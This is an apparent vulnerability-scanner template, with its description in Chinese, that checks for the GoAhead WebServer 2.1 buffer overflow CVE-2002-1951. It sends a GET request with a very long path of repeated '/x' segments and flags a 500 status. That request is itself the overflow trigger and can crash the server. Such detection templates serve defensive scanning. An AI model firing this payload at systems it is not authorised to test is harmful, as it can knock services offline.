[info]
author = "ave"
description = "检测 GoAhead WebServer 2.1 缓冲区溢出漏洞。远程攻击者可通过发送包含大量子目录的特制长 HTTP GET 请求触发缓冲区溢出，导致服务器崩溃或执行任意代码。本验证通过发送超长路径请求检测目标是否存在该漏洞。"
id = "POC-AVE-2002-0732"
name = "CVE-2002-1951 GoAhead WebServer 2.1 缓冲区溢出检测"
severity = "high"
tags = ["ave-2002-0732"]
vuln_id = [
    "CVE-2002-1951",
    "AVE-2002-0732",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [500]
type = "status"
